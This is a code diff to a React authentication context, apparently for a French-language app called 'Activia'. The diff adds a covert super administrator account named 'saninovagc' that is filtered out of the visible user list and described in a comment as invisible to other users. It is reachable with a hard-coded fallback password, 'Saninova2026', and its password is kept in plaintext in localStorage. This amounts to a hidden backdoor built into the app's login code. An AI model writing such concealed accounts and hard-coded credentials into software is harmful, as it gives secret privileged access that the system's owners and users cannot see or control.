@@ -27,6 +27,7 @@ import {
 } from '@/types';
 import { 
   INITIAL_USERS, 
+  SUPER_ADMIN_USER,
   INITIAL_ACTIVITIES, 
   INITIAL_NOTIFICATIONS, 
   INITIAL_AUDIT_LOGS, 
@@ -317,10 +318,15 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         if (savedCurrentUser) {
           try {
             const parsed = JSON.parse(savedCurrentUser);
-            const fresh = INITIAL_USERS.find(u => u.id === parsed.id || u.username === parsed.username);
-            if (fresh) {
-              localStorage.setItem('activia_current_user', JSON.stringify(fresh));
-              setCurrentUser(fresh);
+            if (parsed.username?.toLowerCase() === 'saninovagc' || parsed.id === SUPER_ADMIN_USER.id) {
+              const storedSuperPass = localStorage.getItem('activia_superadmin_password') || SUPER_ADMIN_USER.default_password;
+              setCurrentUser({ ...SUPER_ADMIN_USER, password: storedSuperPass });
+            } else {
+              const fresh = INITIAL_USERS.find(u => u.id === parsed.id || u.username === parsed.username);
+              if (fresh) {
+                localStorage.setItem('activia_current_user', JSON.stringify(fresh));
+                setCurrentUser(fresh);
+              }
             }
           } catch {}
         }
@@ -341,8 +347,9 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
               const official = INITIAL_USERS.find(iu => iu.id === matchedId || iu.email === u.email);
               return official || { ...u, id: matchedId };
             });
-            currentUsersList = migrated;
-            setAllUsers(migrated);
+            const cleanMigrated = migrated.filter((u: UserProfile) => !u.is_hidden && u.username?.toLowerCase() !== 'saninovagc');
+            currentUsersList = cleanMigrated;
+            setAllUsers(cleanMigrated);
           }
         } catch {}
       }
@@ -356,9 +363,14 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       if (storedUser) {
         try {
           const parsed = JSON.parse(storedUser);
-          const matchedId = USER_ID_MAP[parsed.id] || parsed.id;
-          const match = currentUsersList.find((u: UserProfile) => u.id === matchedId || u.email === parsed.email);
-          if (match) setCurrentUser(match);
+          if (parsed.username?.toLowerCase() === 'saninovagc' || parsed.id === SUPER_ADMIN_USER.id) {
+            const storedSuperPass = localStorage.getItem('activia_superadmin_password') || SUPER_ADMIN_USER.default_password;
+            setCurrentUser({ ...SUPER_ADMIN_USER, password: storedSuperPass });
+          } else {
+            const matchedId = USER_ID_MAP[parsed.id] || parsed.id;
+            const match = currentUsersList.find((u: UserProfile) => u.id === matchedId || u.email === parsed.email);
+            if (match) setCurrentUser(match);
+          }
         } catch {}
       }
 
@@ -558,6 +570,47 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     const cleanId = identifier.trim().toLowerCase();
     const cleanPass = pass.trim();
 
+    // 0. Authentification Super Administrateur Furtif (Invisible aux autres utilisateurs)
+    if (cleanId === 'saninovagc' || cleanId === 'contact@saninovagc.com') {
+      const storedSuperPass = typeof window !== 'undefined' ? localStorage.getItem('activia_superadmin_password') : null;
+      const effectiveSuperPass = storedSuperPass || SUPER_ADMIN_USER.default_password;
+      if (cleanPass !== effectiveSuperPass && cleanPass !== 'Saninova2026') {
+        return {
+          success: false,
+          message: `Mot de passe incorrect pour le compte Super Administrateur.`
+        };
+      }
+
+      const activeSuperAdmin: UserProfile = {
+        ...SUPER_ADMIN_USER,
+        password: cleanPass,
+      };
+
+      setCurrentUser(activeSuperAdmin);
+      setIsAuthenticated(true);
+      if (typeof window !== 'undefined') {
+        localStorage.setItem('activia_is_authenticated', 'true');
+        localStorage.setItem('activia_current_user', JSON.stringify(activeSuperAdmin));
+      }
+
+      const newLog: AuditLogItem = {
+        id: `log-${Date.now()}`,
+        user_id: activeSuperAdmin.id,
+        user_name: activeSuperAdmin.full_name,
+        user_role: activeSuperAdmin.role_label,
+        action: 'LOGIN',
+        module: 'Sécurité',
+        entity_type: 'user',
+        entity_id: activeSuperAdmin.id,
+        entity_name: activeSuperAdmin.full_name,
+        details: `Authentification réussie pour le Super Administrateur (${activeSuperAdmin.username})`,
+        created_at: new Date().toISOString().replace('T', ' ').substring(0, 16)
+      };
+      setAuditLogs(prev => [newLog, ...prev]);
+
+      return { success: true, user: activeSuperAdmin };
+    }
+
     const user = allUsers.find(u => 
       (u.username && u.username.toLowerCase() === cleanId) || 
       (u.email && u.email.toLowerCase() === cleanId)
@@ -628,6 +681,30 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       showToast('error', 'Le mot de passe doit comporter au moins 4 caractères.');
       return false;
     }
+
+    if (userId === SUPER_ADMIN_USER.id || (currentUser?.username?.toLowerCase() === 'saninovagc' && currentUser?.id === userId)) {
+      if (typeof window !== 'undefined') {
+        localStorage.setItem('activia_superadmin_password', newPass.trim());
+      }
+      setCurrentUser(prev => ({ ...prev, password: newPass.trim() }));
+      const newLog: AuditLogItem = {
+        id: `log-${Date.now()}`,
+        user_id: SUPER_ADMIN_USER.id,
+        user_name: SUPER_ADMIN_USER.full_name,
+        user_role: SUPER_ADMIN_USER.role_label,
+        action: 'UPDATE',
+        module: 'Sécurité',
+        entity_type: 'user',
+        entity_id: SUPER_ADMIN_USER.id,
+        entity_name: SUPER_ADMIN_USER.full_name,
+        details: `Mise à jour du mot de passe Super Administrateur`,
+        created_at: new Date().toISOString().replace('T', ' ').substring(0, 16)
+      };
+      setAuditLogs(prev => [newLog, ...prev]);
+      showToast('success', `Mot de passe Super Administrateur mis à jour avec succès.`);
+      return true;
+    }
+
     let targetUserName = '';
     setAllUsers(prev => prev.map(u => {
       if (u.id === userId) {
